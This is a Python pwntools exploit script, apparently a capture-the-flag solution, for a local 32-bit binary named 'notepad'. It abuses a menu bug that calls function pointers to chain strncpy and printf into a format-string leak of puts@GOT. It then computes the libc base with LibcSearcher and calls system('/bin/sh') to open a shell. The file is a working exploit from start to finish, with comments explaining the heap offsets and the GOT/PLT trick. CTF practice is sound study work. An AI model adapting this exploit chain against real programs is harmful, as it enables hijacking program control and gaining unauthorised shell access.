#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386",os = "linux", log_level = "debug")

def notepad_init(p):
    p.recvuntil("::> ")
    p.sendline("c")

def notepad_new(p):
    p.recvuntil("::> ")
    p.sendline("a")
    p.recvuntil("size > ")
    p.sendline("16")
    p.recvuntil("data > ")
    p.sendline("\x00")

def notepad_open(p, id, content, option):
    p.recvuntil("::> ")
    p.sendline("b")
    p.recvuntil("id > ")
    p.sendline("%d" % id)
    p.recvuntil("edit (Y/n)")
    p.sendline("Y")
    p.recvuntil("content > ")
    p.sendline(content)
    p.recvuntil("::> ")
    p.sendline(option)

def notepad_open_noinput(p, id, option):
    p.recvuntil("::> ")
    p.sendline("b")
    p.recvuntil("id > ")
    p.sendline("%d" % id)
    p.recvuntil("::> ")
    p.sendline(option)


p = process('./notepad')
elf = ELF('./notepad')
gdb_command =   """
                b *0x8048ae7
                b *0x8048ce8
                """
# 0x8048ae7: malloc on notepad_new
# 0x8048ce8: call eax on notepad_open
strncpy_plt = elf.plt['strncpy']
"""
    The PLT address of printf end with 0x00, obstructed the copy from 
stack variable array s in notepad_open() to v1->text in heap on strncpy()
function. According to PLT/GOT mechanism, call to PLT entry address + 6 
will lead to dynamic linker refilling the GOT table entry and reinvoke
function again. So add the origin PLT address to a offset 0x6 will have
the same effect on calling the pure PLT entry.
"""
printf_plt = elf.plt['printf'] + 0x6
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
time.sleep(1)
# gdb.attach(p, gdb_command)


notepad_init(p)
"""
    Via experimenting, every 0x20 Bytes memory block allocation request 
sent to malloc() would lead to a 0x30 Bytes offset between two memory 
block pointers.
"""
for i in range(4):
    notepad_new(p) # Apply memory for 4 notepadStruct

# Write strncpy() address to notepadStruct0.text(&notepadStruct0+16B)
notepad_open(p, 0, p32(strncpy_plt), "a")
"""
    First, send the printf format string to stack variable array s. The 
11th argument will be the GOT adress of puts. We need to leak that.
    Secondly, there exists a vulnerability in menu() so we can call arbitary
function, and the offset between &notepadStruct1 and &notepadStruct0.text
is 0x20, so we minus 8 here in the option.
    In all, we executed strncpy(&notepadStruct1, "%11$s", 16).
"""
notepad_open(p, 1, "%11$s    " + "\x00", chr(ord("a") - 8))
# Write printf() address to notepadStruct0.text(&notepadStruct0+16B)
notepad_open(p, 0, p32(printf_plt), "a")
"""
    Here we wrote GOT address of puts() to the stack also the 11th argument
position and called the printf().
    In all, we executed printf("%11$s", ... (9 arguments), got_of_puts) to
leak the libc address of puts to find libc base offset.
"""
notepad_open(p, 1, p32(puts_got) + "    \x00", chr(ord("a") - 8))

puts_libc = u32(p.recv(4))
print("puts libc: %s" % hex(puts_libc))
libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
print("base libc: %s" % hex(libc_base))
system_libc = libc_base + libc.dump('system')
print("system libc: %s" % hex(system_libc))

# Similarly, copy "/bin/sh" as the first argument
notepad_open(p, 2, p32(strncpy_plt), "a")
notepad_open(p, 3, "/bin/sh" + "\x00", chr(ord("a") - 8))
# Prepare system()
notepad_open(p, 2, p32(system_libc), "a")
# Call system("/bin/sh")
notepad_open_noinput(p, 3, chr(ord("a") - 8))

p.interactive()